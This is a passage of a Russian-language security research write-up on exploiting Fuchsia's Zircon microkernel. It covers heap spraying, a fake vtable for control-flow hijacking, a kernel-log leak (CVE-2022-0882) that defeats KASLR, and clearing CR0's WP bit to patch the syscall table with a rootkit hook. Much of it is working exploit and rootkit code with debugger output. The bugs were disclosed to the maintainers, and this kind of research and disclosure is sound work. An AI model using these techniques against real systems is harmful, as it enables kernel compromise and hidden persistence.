Тогда я решил не тратить время на изучение анатомии объекта `TimerDispatcher` и вместо этого пошел напролом. С помощью heap spraying я заменил все содержимое `TimerDispatcher` нулями и стал смотреть, что произойдет. Микроядро Zircon ушло в отказ на проверке счетчика ссылок в `zircon/system/ulib/fbl/include/fbl/ref_counted_internal.h:57`:

```c++
    const int32_t rc = ref_count_.fetch_add(1, std::memory_order_relaxed);

    //...
    if constexpr (EnableAdoptionValidator) {
      ZX_ASSERT_MSG(rc >= 1, "count %d(0x%08x) < 1\n", rc, static_cast<uint32_t>(rc));
    }

```

Это не проблема. С помощью отладчика я определил, что этот счетчик хранится по отступу в 8 байт от начала объекта `TimerDispatcher`. Чтобы Zircon не падал на данной проверке, я задал ненулевое значение в соответствующем байте для heap spraying:

```c
  unsigned int *refcount_ptr = (unsigned int *)&spray_data[8];

  *refcount_ptr = 0x1337C0DE;
```

Тогда запуск прототипа эксплойта на Fuchsia прошел дальше по коду ядра и окончился уже другим падением Zircon, которое оказалось более интересным с точки зрения атакующего. Микроядро выполнило разыменование нулевого указателя в функции `HandleTable::GetDispatcherWithRights<TimerDispatcher>`. Пошаговая отладка в GDB помогла мне выяснить, что ошибка происходит вот в этом чародействе на `C++`:

```cpp
// Dispatcher -> FooDispatcher
template <typename T>
fbl::RefPtr<T> DownCastDispatcher(fbl::RefPtr<Dispatcher>* disp) {
  return (likely(DispatchTag<T>::ID == (*disp)->get_type()))
             ? fbl::RefPtr<T>::Downcast(ktl::move(*disp))
             : nullptr;
}
```

Здесь Zircon вызывает публичный метод `get_type()` для класса `TimerDispatcher`. Адрес этой функции определяется с помощью таблицы виртуальных методов (или [C++ vtable](https://en.wikipedia.org/wiki/Virtual_method_table)). Указатель на такую таблицу находится в самом начале объекта `TimerDispatcher`. Эту функциональность можно использовать для перехвата потока управления (control-flow hijacking), и тогда не нужно искать подходящие ядерные объекты, содержащие указатели на функции (как это требуется в аналогичных атаках для ядра Linux).

# Обход защиты KASLR для Zircon

Для перехвата потока управления нужно знать адреса ядерных функций, которые зависят от KASLR — защитного механизма, выполняющего рандомизацию расположения адресного пространства ядра (kernel address space layout randomization). С его помощью код ядра располагается по случайному отступу от фиксированного адреса. В исходном коде Zircon механизм KASLR упоминается множество раз. Вот пример из файла `zircon/kernel/params.gni`:

```python
  # Virtual address where the kernel is mapped statically.  This is the
  # base of addresses that appear in the kernel symbol table.  At runtime
  # KASLR relocation processing adjusts addresses in memory from this base
  # to the actual runtime virtual address.
  if (current_cpu == "arm64") {
    kernel_base = "0xffffffff00000000"
  } else if (current_cpu == "x64") {
    kernel_base = "0xffffffff80100000"  # Has KERNEL_LOAD_OFFSET baked into it.
  }
```

Чтобы обойти защиту KASLR, я решил применить один из своих трюков для ядра Linux. Мой [прототип эксплойта для CVE-2021-26708](https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html) использовал утечку информации из журнала ядра Linux, чтобы определить секретный отступ KASLR. В операционной системе Fuchsia ядерный журнал также содержит ценную информацию для атакующего. Поэтому я решил попытаться прочитать журнал микроядра Zircon из моего непривилегированного компонента в пользовательском пространстве. Для этого я добавил строку `use: [ { protocol: "fuchsia.boot.ReadOnlyLog" } ]` в манифест компонента и попробовал открыть ядерный журнал:

```c++
  zx::channel local, remote;
  zx_status_t status = zx::channel::create(0, &local, &remote);
  if (status != ZX_OK) {
    fprintf(stderr, "Failed to create channel: %d\n", status);
    return -1;
  }

  const char kReadOnlyLogPath[] = "/svc/" fuchsia_boot_ReadOnlyLog_Name;
  status = fdio_service_connect(kReadOnlyLogPath, remote.release());
  if (status != ZX_OK) {
    fprintf(stderr, "Failed to connect to ReadOnlyLog: %d\n", status);
    return -1;
  }

  zx_handle_t h;
  status = fuchsia_boot_ReadOnlyLogGet(local.get(), &h);
  if (status != ZX_OK) {
    fprintf(stderr, "ReadOnlyLogGet failed: %d\n", status);
    return -1;
  }
```

В этом коде создается специальный канал (Fuchsia channel), который затем используется для протокола `ReadOnlyLog`. Для этого вызываются функции из библиотеки `fdio`, которая предоставляет единый интерфейс для файлов, сокетов, каналов, сервисов в Fuchsia. При запуске компонента система выдает следующую ошибку:

```
[ffx-laboratory:a13x_pwns_fuchsia] WARNING: Failed to route protocol `fuchsia.boot.ReadOnlyLog` with
  target component `/core/ffx-laboratory:a13x_pwns_fuchsia`: A `use from parent` declaration was found
  at `/core/ffx-laboratory:a13x_pwns_fuchsia` for `fuchsia.boot.ReadOnlyLog`, but no matching `offer`
  declaration was found in the parent
[ffx-laboratory:a13x_pwns_fuchsia] INFO: [!] try opening kernel log...
[ffx-laboratory:a13x_pwns_fuchsia] INFO: ReadOnlyLogGet failed: -24
```

Это корректное поведение. Мой компонент не имеет заявленных привилегий. Со стороны системы нет разрешения `offer` на использование протокола `fuchsia.boot.ReadOnlyLog`, поэтому Fuchsia возвращает ошибку при подключении канала к ядерному журналу. Не судьба...

Я отбросил мысль об обходе KASLR с помощью утечки информации из ядерного журнала и стал бродить по исходному коду Zircon в ожидании новой идеи. Тут вдруг я наткнулся на системный вызов `zx_debuglog_create()`, который дает совсем другой способ доступа к ядерному журналу:

```c
zx_status_t zx_debuglog_create(zx_handle_t resource,
                               uint32_t options,
                               zx_handle_t* out);
```

В документации по [системным вызовам Fuchsia](https://fuchsia.dev/fuchsia-src/reference/syscalls/debuglog_create?hl=en) говорится, что аргумент `resource` __обязательно должен__ иметь тип `ZX_RSRC_KIND_ROOT`. Мой прототип эксплойта, конечно же, не обладал таким ресурсом, но я все равно попробовал вызвать `zx_debuglog_create()` наудачу:

```c
zx_handle_t root_resource; // global var initialized by 0

int main(int argc, const char** argv)
{
  zx_status_t status;
  zx_handle_t debuglog;

  status = zx_debuglog_create(root_resource, ZX_LOG_FLAG_READABLE, &debuglog);
  if (status != ZX_OK) {
    printf("[-] can't create debuglog, no way\n");
    return 1;
  }
```

И этот код сработал! Мой непривилегированный компонент получил доступ к журналу Zircon без необходимых привилегий и при отсутствии ресурса `ZX_RSRC_KIND_ROOT`. Что за чудеса? Я нашел код Fuchsia, который отвечает за обработку этого системного вызова, и рассмеялся:

```c
zx_status_t sys_debuglog_create(zx_handle_t rsrc, uint32_t options, user_out_handle* out) {
  LTRACEF("options 0x%x\n", options);

  // TODO(fxbug.dev/32044) Require a non-INVALID handle.
  if (rsrc != ZX_HANDLE_INVALID) {
    // TODO(fxbug.dev/30918): finer grained validation
    zx_status_t status = validate_resource(rsrc, ZX_RSRC_KIND_ROOT);
    if (status != ZX_OK)
      return status;
  }
```

Здесь функция `validate_resource()` проверяет, что ресурс имеет тип `ZX_RSRC_KIND_ROOT`, только если он ненулевой. Прекрасная проверка доступа (сарказм)!

В трекере Fuchsia я хотел посмотреть задачи 32044 и 30918, которые указаны в комментариях к коду, но получил `access denied`. Похоже, процесс разработки Fuchsia не вполне открыт для сообщества, как было заявлено Google. Тогда я создал в трекере [security bug](https://bugs.fuchsia.dev/p/fuchsia/issues/detail?id=94740) и описал, что ошибка проверки доступа в `sys_debuglog_create()` приводит к утечке информации из ядерного журнала (для корректного отображения информации в трекере нажмите кнопку `Markdown` в правом верхнем углу). Мейнтейнеры проекта Fuchsia подтвердили проблему безопасности и назначили для нее идентификатор [CVE-2022-0882](https://nvd.nist.gov/vuln/detail/CVE-2022-0882).

# Зря старался: KASLR для Zircon не работает

Поскольку мой прототип эксплойта теперь мог выполнять чтение ядерного журнала, я извлек из него несколько ядерных указателей, чтобы вычислить секретный отступ KASLR. Но как же я удивился, когда повторил эту операцию при следующем запуске Fuchsia.

> Несмотря на KASLR, ядерные адреса не изменялись при перезапуске Fuchsia.

Ниже представлен пример. Как говорится, найдите пять отличий. Загрузка № 1:
```
[0.197] 00000:01029> INIT: cpu 0, calling hook 0xffffffff00263f20 (pmm_boot_memory) at level 0xdffff, flags 0x1
[0.197] 00000:01029> Free memory after kernel init: 8424374272 bytes.
[0.197] 00000:01029> INIT: cpu 0, calling hook 0xffffffff00114040 (kernel_shell) at level 0xe0000, flags 0x1
[0.197] 00000:01029> INIT: cpu 0, calling hook 0xffffffff0029e300 (userboot) at level 0xe0000, flags 0x1
[0.200] 00000:01029> userboot: ramdisk       0x18c5000 @ 0xffffff8003bdd000
[0.201] 00000:01029> userboot: userboot rodata       0 @ [0x2ca730e3000,0x2ca730e9000)
[0.201] 00000:01029> userboot: userboot code    0x6000 @ [0x2ca730e9000,0x2ca73100000)
[0.201] 00000:01029> userboot: vdso/next rodata       0 @ [0x2ca73100000,0x2ca73108000)
```

Загрузка № 2:
```
[0.194] 00000:01029> INIT: cpu 0, calling hook 0xffffffff00263f20 (pmm_boot_memory) at level 0xdffff, flags 0x1
[0.194] 00000:01029> Free memory after kernel init: 8424361984 bytes.
[0.194] 00000:01029> INIT: cpu 0, calling hook 0xffffffff00114040 (kernel_shell) at level 0xe0000, flags 0x1
[0.194] 00000:01029> INIT: cpu 0, calling hook 0xffffffff0029e300 (userboot) at level 0xe0000, flags 0x1
[0.194] 00000:01029> userboot: ramdisk       0x18c5000 @ 0xffffff8003bdd000
[0.198] 00000:01029> userboot: userboot rodata       0 @ [0x2bc8b83c000,0x2bc8b842000)
[0.198] 00000:01029> userboot: userboot code    0x6000 @ [0x2bc8b842000,0x2bc8b859000)
[0.198] 00000:01029> userboot: vdso/next rodata       0 @ [0x2bc8b859000,0x2bc8b861000)
```

Здесь видно, что ядерные адреса совпадают, то есть KASLR не работает. В трекере Fuchsia я создал [security bug](https://bugs.fuchsia.dev/p/fuchsia/issues/detail?id=94731) с описанием этой неполадки, на что мейнтейнеры ответили, что эта проблема им уже известна.

Операционная система Fuchsia оказалась более экспериментальной, чем я ожидал.

# Таблицы виртуальных методов в Zircon

Обнаружив, что функции микроядра имеют постоянные адреса, я понял, что для перехвата потока управления нет препятствий. Поэтому я стал разбираться, как устроены таблицы виртуальных методов в `C++`-объектах Zircon, чтобы воспользоваться этим для развития атаки.

Указатель на таблицу виртуальных методов хранится в самом начале объекта. Вот что отладчик показывает для объекта `TimerDispatcher`:

```
(gdb) info vtbl *(TimerDispatcher *)0xffffff802c5ae768
vtable for 'TimerDispatcher' @ 0xffffffff003bd11c (subobject @ 0xffffff802c5ae768):
[0]: 0xffdffe64ffdffd24
[1]: 0xffdcb5a4ffe00454
[2]: 0xffdffea4ffdc7824
[3]: 0xffd604c4ffd519f4
...
```

В vtable хранятся странные значения типа `0xffdcb5a4ffe00454`, определенно не являющиеся ядерными адресами. Чтобы понять, как это работает, я стал смотреть код, использующий таблицу виртуальных методов объекта `TimerDispatcher`:

```cpp
// Dispatcher -> FooDispatcher
template <typename T>
fbl::RefPtr<T> DownCastDispatcher(fbl::RefPtr<Dispatcher>* disp) {
  return (likely(DispatchTag<T>::ID == (*disp)->get_type()))
             ? fbl::RefPtr<T>::Downcast(ktl::move(*disp))
             : nullptr;
}
```

В этой высокоуровневой мудрости на `C++` я ничего не понял и стал смотреть код на языке ассемблера:

```
  mov    rax,QWORD PTR [r13+0x0]
  movsxd r11,DWORD PTR [rax+0x8]
  add    r11,rax
  mov    rdi,r13
  call   0xffffffff0031a77c <__x86_indirect_thunk_r11>
```

Здесь все проще. Регистр `r13` содержит адрес объекта `TimerDispatcher`. Указатель на vtable находится в самом начале объекта, поэтому после первой инструкции `mov` он попадает в регистр `rax`. Затем инструкция `movsxd` помещает значение `0xffdcb5a4ffe00454` из таблицы виртуальных методов в регистр `r11`. При этом `movsxd` выполняет знаковое расширение 32-битного источника до 64-битного приемника. Таким образом `0xffdcb5a4ffe00454` превращается в `0xffffffffffe00454`. Затем к получившемуся значению в `r11` прибавляется адрес самой таблицы виртуальных методов. В результате этого сложения в регистре `r11` оказывается адрес метода `get_type()`:

```
(gdb) x $r11
0xffffffff001bd570 <_ZNK15TimerDispatcher8get_typeEv>:	0x000016b8e5894855
```

Получается, таблица виртуальных методов адресует методы объекта относительно своего собственного расположения в памяти ядра.

# Мастерим фальшивую таблицу виртуальных методов

Итак, я решил сконструировать фальшивую таблицу виртуальных методов для объекта `TimerDispatcher`, чтобы перехватить поток управления в микроядре Zircon. Возник вопрос: где мне ее разместить? Самый простой путь — расположить ее в пользовательском пространстве, в памяти эксплойта. Однако Zircon для `x86_64` поддерживает аппаратную функцию `SMAP` (Supervisor Mode Access Prevention), которая блокирует ядру доступ к данным в пользовательском пространстве.

> В моей [карте средств защиты ядра Linux](https://github.com/a13xp0p0v/linux-kernel-defence-map) вы можете увидеть SMAP и другие средства защиты от перехвата потока управления.

Я придумал два способа обойти защиту `SMAP`:
  1. Можно попробовать реализовать атаку `ret2dir` для микроядра Zircon, так как в нем тоже используется отображение памяти `physmap`.
  2. Можно использовать утечку информации из ядерного журнала, чтобы найти ядерный адрес, указывающий на данные под контролем атакующего. Размещение фальшивой vtable по этому адресу в пространстве ядра также позволит обойти `SMAP`.

Но чтобы излишне не усложнять свой первый эксперимент с безопасностью Zircon, я решил пока отключить функции `SMAP` и `SMEP` для виртуальной машины с Fuchsia и разместил vtable в эксплойте в пользовательском пространстве:

```c
#define VTABLE_SZ 16
unsigned long fake_vtable[VTABLE_SZ] = { 0 }; // global array
```

Затем я использовал указатель на мою фальшивую таблицу виртуальных методов при heap spraying:

```c
#define DATA_SZ 512
  unsigned char spray_data[DATA_SZ] = { 0 };
  unsigned long **vtable_ptr = (unsigned long **)&spray_data[0];

  // Control-flow hijacking in DownCastDispatcher():
  //   mov    rax,QWORD PTR [r13+0x0]
  //   movsxd r11,DWORD PTR [rax+0x8]
  //   add    r11,rax
  //   mov    rdi,r13
  //   call   0xffffffff0031a77c <__x86_indirect_thunk_r11>

  *vtable_ptr = &fake_vtable[0]; // address in rax
  fake_vtable[1] = (unsigned long)pwn - (unsigned long)*vtable_ptr; // value for DWORD PTR [rax+0x8]
```

Это очень интересный фрагмент эксплойта. Здесь массив `spray_data` содержит данные для системного вызова `zx_fifo_write()`, с помощью которого выполняется heap spraying и перезаписывается `TimerDispatcher`. Поскольку адрес таблицы виртуальных методов должен находиться в начале объекта `TimerDispatcher`, указатель `vtable_ptr` устанавливается на начало массива `spray_data`. Затем с помощью `vtable_ptr` в данные для спрея записывается адрес фальшивой таблицы `fake_vtable`. Позже при перехвате потока управления в ядерной функции `DownCastDispatcher()` этот адрес `fake_vtable` окажется в регистре `rax`. Поэтому элемент `fake_vtable[1]`, адресуемый с помощью `DWORD PTR [rax+0x8]`, должен содержать значение, используемое ядром для вычисления адреса метода `TimerDispatcher.get_type()`. А в качестве этого метода `get_type()` я хочу вызвать свою функцию `pwn()` из эксплойта, поэтому в элемент `fake_vtable[1]` я записываю разность между адресом функции `pwn()` и адресом моей фальшивой таблицы виртуальных методов.

Рассмотрим реальный пример того, как ядро работает с этой фальшивой таблицей виртуальных методов, когда исполняется эксплойт:

 1. Массив `fake_vtable` расположен по адресу `0x35aa74aa020`, а функция `pwn()` — по адресу `0x35aa74a80e0`.
 2. В элементе `fake_vtable[1]` содержится значение `0x35aa74a80e0 - 0x35aa74aa020 = 0xffffffffffffe0c0`.
 3. При выполнении ядерной функции `DownCastDispatcher()` на это значение будет указывать адрес `rax+0x8`.
 4. После того как Zircon выполнит инструкцию `movsxd r11, DWORD PTR [rax+0x8]`, регистр `r11` также будет содержать `0xffffffffffffe0c0`.
 5. Суммирование `r11` и `rax`, в котором содержится адрес `0x35aa74aa020` массива `fake_vtable`, в результате даст значение `0x35aa74a80e0`. Это адрес функции `pwn()`.
 6. Когда Zircon вызовет `__x86_indirect_thunk_r11`, функция `pwn()` из эксплойта получит управление.

# Что бы такое взломать в Fuchsia

> Когда я добился исполнения произвольного кода в микроядре Zircon, я стал думать: что с помощью этого можно атаковать?

Первой моей мыслью было подделать тот суперресурс `ZX_RSRC_KIND_ROOT`, который я видел в `zx_debuglog_create()`. Однако я не смог придумать, как с его помощью повысить привилегии, потому что `ZX_RSRC_KIND_ROOT` нечасто используется в исходном коде Fuchsia.

Понимая, что Zircon — это микроядро, я осознал, что для повышения привилегий в Fuchsia потребуется атаковать средства межпроцессного взаимодействия. Другими словами, мне нужно было из микроядра перехватить IPC между компонентами Fuchsia, например между моим непривилегированным эксплойтом и менеджером компонентов ([component manager](https://fuchsia.dev/fuchsia-src/get-started/learn/intro/components?hl=en#component_manager)), обладающим высокими привилегиями. Поэтому я вернулся к изучению устройства пользовательского пространства Fuchsia. Это было сложно и скучновато... Но внезапно мне в голову пришла идея.

> А почему бы не поставить руткит в микроядро Zircon?

Это показалось мне более интересным, и я стал разбираться, как Zircon обрабатывает свои системные вызовы.

# Системные вызовы в Fuchsia

Жизненный цикл системного вызова в Fuchsia кратко описан в [ее документации](https://fuchsia.dev/fuchsia-src/concepts/kernel/life_of_a_syscall?hl=en). В Zircon тоже есть таблица системных вызовов (syscall table), как и в ядре Linux. Для микроархитектуры `x86_64` в Zircon определена функция `x86_syscall()` из файла [fuchsia/zircon/kernel/arch/x86/syscall.S](https://fuchsia.googlesource.com/fuchsia/+/refs/heads/main/zircon/kernel/arch/x86/syscall.S), реализованная на языке ассемблера:

```asm
    cmp     $ZX_SYS_COUNT, %rax
    jae     .Lunknown_syscall
    leaq    .Lcall_wrapper_table(%rip), %r11
    movq    (%r11,%rax,8), %r11
    lfence
    jmp     *%r11
```

Вот как этот код выглядит в отладчике:

```
   0xffffffff00306fc8 <+56>:	cmp    rax,0xb0
   0xffffffff00306fce <+62>:	jae    0xffffffff00306fe1 <x86_syscall+81>
   0xffffffff00306fd0 <+64>:	lea    r11,[rip+0xbda21]        # 0xffffffff003c49f8
   0xffffffff00306fd7 <+71>:	mov    r11,QWORD PTR [r11+rax*8]
   0xffffffff00306fdb <+75>:	lfence 
   0xffffffff00306fde <+78>:	jmp    r11
```

Обратите внимание: отладчик показывает, что таблица системных вызовов расположена по адресу `0xffffffff003c49f8`. Посмотрим ее содержимое:

```
(gdb) x/10xg 0xffffffff003c49f8
0xffffffff003c49f8:	0xffffffff00307040	0xffffffff00307050
0xffffffff003c4a08:	0xffffffff00307070	0xffffffff00307080
0xffffffff003c4a18:	0xffffffff00307090	0xffffffff003070b0
0xffffffff003c4a28:	0xffffffff003070d0	0xffffffff003070f0
0xffffffff003c4a38:	0xffffffff00307110	0xffffffff00307130

$ disassemble 0xffffffff00307040
Dump of assembler code for function x86_syscall_call_bti_create:
   0xffffffff00307040 <+0>:	mov    r8,rcx
   0xffffffff00307043 <+3>:	mov    rcx,r10
...
```

Первый адрес `0xffffffff00307040` в таблице системных вызовов указывает на функцию `x86_syscall_call_bti_create()`. Это обработчик системного вызова номер ноль, он определен в автоматически сгенерированном файле `kernel-wrappers.inc` в директории `gen/zircon/vdso/include/lib/syscalls/`. А последний системный вызов в таблице — это `x86_syscall_call_vmo_create_physical()` номер 175 по адресу `0xffffffff00307d10`. Поэтому константа `ZX_SYS_COUNT` имеет значение 176. Распечатаем в отладчике всю таблицу системных вызовов (и немного больше):

```
(gdb) x/178xg 0xffffffff003c49f8
0xffffffff003c49f8:	0xffffffff00307040	0xffffffff00307050
0xffffffff003c4a08:	0xffffffff00307070	0xffffffff00307080
0xffffffff003c4a18:	0xffffffff00307090	0xffffffff003070b0
...
0xffffffff003c4f58:	0xffffffff00307ce0	0xffffffff00307cf0
0xffffffff003c4f68:	0xffffffff00307d00	0xffffffff00307d10
0xffffffff003c4f78 <_ZN6cpu_idL21kTestDataCorei5_6260UE>:	0x0300010300000300	0x0004030003030002
```

Здесь видно, что ранее упомянутый указатель на функцию `0xffffffff00307d10` — это последний системный вызов в таблице. Этого знания мне было достаточно для экспериментов с постановкой руткита.

# Постановка руткита в микроядро Zircon

В качестве первого эксперимента я перезаписал всю таблицу системных вызовов значением `0x41`, получив управление в моей функции `pwn()`. Как было сказано выше, эта функция выполняется в результате перехвата потока управления в Zircon. Для того чтобы перезаписать таблицу системных вызовов, которая доступна только для чтения, я использовал старый добрый прием со сбросом бита `WP` в контрольном регистре `CR0`:

```c
#define SYSCALL_TABLE 0xffffffff003c49f8
#define SYSCALL_COUNT 176

int pwn(void)
{
  unsigned long cr0_value = read_cr0();

  cr0_value = cr0_value & (~0x10000); // Set WP flag to 0

  write_cr0(cr0_value);

  memset((void *)SYSCALL_TABLE, 0x41, sizeof(unsigned long) * SYSCALL_COUNT);
}
```

Функции записи и чтения контрольного регистра `CR0`:

```c
void write_cr0(unsigned long value)
{
  __asm__ volatile("mov %0, %%cr0" : : "r"(value));
}

unsigned long read_cr0(void)
{
  unsigned long value;
  __asm__ volatile("mov %%cr0, %0" : "=r"(value));
  return value;
}
```

Результат перезаписи таблицы системных вызовов виден в отладчике:

```
(gdb) x/178xg 0xffffffff003c49f8
0xffffffff003c49f8:	0x4141414141414141	0x4141414141414141
0xffffffff003c4a08:	0x4141414141414141	0x4141414141414141
0xffffffff003c4a18:	0x4141414141414141	0x4141414141414141
...
0xffffffff003c4f58:	0x4141414141414141	0x4141414141414141
0xffffffff003c4f68:	0x4141414141414141	0x4141414141414141
0xffffffff003c4f78 <_ZN6cpu_idL21kTestDataCorei5_6260UE>:	0x0300010300000300	0x0004030003030002
```

Это сработало. Отлично. Я стал думать, как осуществить перехват системных вызовов микроядра. Сделать это по аналогии с поведением ядерных руткитов для Linux было невозможно. Дело в том, что обычно руткит для Linux — это ядерный модуль, в котором хуки (функции-перехватчики) реализованы как функции этого модуля __в пространстве ядра__. А в моем случае я пытался поставить руткит в микроядро из эксплойта в __пользовательском пространстве__. Код из эксплойта не мог работать как ядерный хук, потому что он присутствовал только в адресном пространстве моего пользовательского процесса.

Поэтому я решил превратить в хук руткита какой-либо имеющийся в Zircon код. Первым кандидатом на перезапись стала ядерная функция `assert_fail_msg()`, которая меня конкретно достала, пока я разрабатывал свой прототип эксплойта. Размер этой функции был достаточно большим, чтобы разместить вместо нее мой хук для руткита.

Сначала я написал хук для системного вызова `zx_process_create()` на языке C, но мне совсем не понравился исполняемый код, который сгенерировал компилятор. Из-за этого я переписал его на языке ассемблера:

```c
#define XSTR(A) STR(A)
#define STR(A) #A

#define ZIRCON_ASSERT_FAIL_MSG 0xffffffff001012e0
#define HOOK_CODE_SIZE 60
#define ZIRCON_PRINTF 0xffffffff0010fa20
#define ZIRCON_X86_SYSCALL_CALL_PROCESS_CREATE 0xffffffff003077c0

void process_create_hook(void)
{
  __asm__ ( "push %rax;"
	    "push %rdi;"
	    "push %rsi;"
	    "push %rdx;"
	    "push %rcx;"
	    "push %r8;"
	    "push %r9;"
	    "push %r10;"
	    "xor %al, %al;"
	    "mov $" XSTR(ZIRCON_ASSERT_FAIL_MSG + 1 + HOOK_CODE_SIZE) ",%rdi;"
	    "mov $" XSTR(ZIRCON_PRINTF) ",%r11;"
	    "callq *%r11;"
	    "pop %r10;"
	    "pop %r9;"
	    "pop %r8;"
	    "pop %rcx;"
	    "pop %rdx;"
	    "pop %rsi;"
	    "pop %rdi;"
	    "pop %rax;"
            "mov $" XSTR(ZIRCON_X86_SYSCALL_CALL_PROCESS_CREATE) ",%r11;"
	    "jmpq *%r11;");
}
```

Получилось здорово:

 1. Хук сохраняет в ядерном стеке значения всех регистров, которые могут быть испорчены (clobbered) при последующих вызовах функций.
 2. Подготавливается и вызывается ядерная функция `printf()`:
   - Первый аргумент этой функции передается через регистр `rdi`. В него помещается адрес строки, которую я хочу напечатать в ядерном журнале. Подробнее про эту строку расскажу дальше. Трюк с макросами `STR` и `XSTR` называется [стрингификацией (stringizing)](https://gcc.gnu.org/onlinedocs/gcc-11.3.0/cpp/Stringizing.html#Stringizing). Она служит для преобразования фрагмента кода в строковую константу.
   - Нулевой `al` указывает, что векторные аргументы не передаются функции `printf()`, имеющей переменное количество аргументов.
   - В регистр `r11` помещается адрес функции `printf()` микроядра Zircon, которую затем вызывает инструкция `callq *%r11`.
 3. После вызова `printf()` восстанавливаются начальные значения регистров.
 4. Наконец хук выполняет прыжок на настоящий обработчик системного вызова `zx_process_create()`.

А теперь перейдем к самой интересной части — постановке руткита. Функция `pwn()` из эксплойта копирует исполняемый код хука на место функции `assert_fail_msg()` в микроядре Zircon:

```c
#define ZIRCON_ASSERT_FAIL_MSG 0xffffffff001012e0
#define HOOK_CODE_OFFSET 4
#define HOOK_CODE_SIZE 60

  char *hook_addr = (char *)ZIRCON_ASSERT_FAIL_MSG;
  hook_addr[0] = 0xc3; // ret to avoid assert
  hook_addr++;
  memcpy(hook_addr, (char *)process_create_hook + HOOK_CODE_OFFSET, HOOK_CODE_SIZE);
  hook_addr += HOOK_CODE_SIZE;
  const char *pwn_msg = "ROOTKIT HOOK: syscall 102 process_create()\n";
  strncpy(hook_addr, pwn_msg, strlen(pwn_msg) + 1);

#define SYSCALL_N_PROCESS_CREATE 102
#define SYSCALL_TABLE 0xffffffff003c49f8

  unsigned long *syscall_table_item = (unsigned long *)SYSCALL_TABLE;
  syscall_table_item[SYSCALL_N_PROCESS_CREATE] = (unsigned long)ZIRCON_ASSERT_FAIL_MSG + 1; // after ret

  return 42; // don't pass the type check in DownCastDispatcher
```

Рассмотрим этот процесс подробнее:

1. Переменная `hook_addr` инициализируется адресом ядерной функции `assert_fail_msg()`.
2. Первый байт функции перезаписывается значением `0xc3`, что соответствует инструкции `ret`. С помощью этого я избегаю отказа микроядра при неуспешной проверке assertion. Теперь, если Zircon вызывает `assert_fail_msg()`, происходит немедленный возврат из функции, и ядро продолжает работать.
3. Вслед за байтом `0xc3` эксплойт располагает исполняемый код хука `process_create_hook()` для системного вызова `zx_process_create()`. Устройство хука я описал выше.
4. После кода хука эксплойт располагает строку сообщения, которую я хочу печатать в ядерном журнале на каждом системном вызове `zx_process_create()`. Когда хук выполнит инструкцию `mov $" XSTR(ZIRCON_ASSERT_FAIL_MSG + 1 + HOOK_CODE_SIZE) ",%rdi`, адрес этой строки попадет в регистр `rdi`. Здесь один байт прибавлен к адресу строки из-за дополнительной инструкции `ret`, которая была записана в начале функции `assert_fail_msg()`.
5. После размещения хука и его строки в ядерном коде функция `pwn()` записывает адрес хука `ZIRCON_ASSERT_FAIL_MSG + 1` в 102-й элемент таблицы системных вызовов, который должен указывать на обработчик для `zx_process_create()`.
6. Наконец, функция `pwn()` эксплойта возвращает число 42. Зачем? Как было описано выше, Zircon использует мою фальшивую таблицу виртуальных методов и вызывает `pwn()` в качестве метода `TimerDispatcher.get_type()`. Настоящий метод `get_type()` для этого ядерного объекта возвращает число 16, чтобы пройти проверку типа и продолжить исполнение. А я возвращаю 42, чтобы, напротив, проверка типа не сработала, обработка системного вызова `zx_timer_cancel()` поскорее закончилась и из-за атакованного объекта `TimerDispatcher` в системе больше ничего не сломалось.

Вот и все. Руткит установлен в микроядро Zircon операционной системы Fuchsia!

# Демонстрация прототипа эксплойта

Для этой демонстрации я реализовал второй аналогичный хук для системного вызова `zx_process_exit()` и разместил его на месте ядерной функции `assert_fail()`. Таким образом, при создании и завершении процессов руткит печатает в ядерном журнале сообщения. Демонстрация работы эксплойта:

<div style="position:relative;padding-top:56.25%;">
  <iframe src="https://www.youtube.com/embed/JPg-VHuKQIQ" frameborder="0" allowfullscreen
    style="position:absolute;top:0;left:0;width:100%;height:100%;"></iframe>
</div>
<br/>

17 июня по инициативе Google был организован видеозвонок с командой разработчиков Fuchsia. Мне было интересно получить обратную связь по своему исследованию, пообщаться о модели угроз и средствах защиты микроядра Zircon. По словам архитектора безопасности Fuchsia OS, он бы атаковал систему так же, как и я, но на последнем этапе вместо постановки руткита он попробовал бы закрепиться в системе (persistence) или атаковать IPC.

# Заключение

Вот так я познакомился с операционной системой Fuchsia и ее микроядром Zircon. Я давно хотел применить свои навыки и посмотреть на эту интересную ОС с точки зрения атакующего.

В статье я сделал обзор архитектуры безопасности Fuchsia, описал инструментарий для разработки ОС и рассказал про свои эксперименты с эксплуатацией уязвимостей для микроядра Zircon. Я сообщил мейнтейнерам Fuchsia о проблемах безопасности, обнаруженных в ходе исследования.

Это одна из первых публичных работ по безопасности операционной системы Fuchsia. Думаю, она будет полезна сообществу исследователей безопасности, поскольку освещает практические аспекты эксплуатации уязвимостей и защиты в микроядерной ОС. Буду рад, если эта статья вдохновит вас на эксперименты с безопасностью операционных систем.
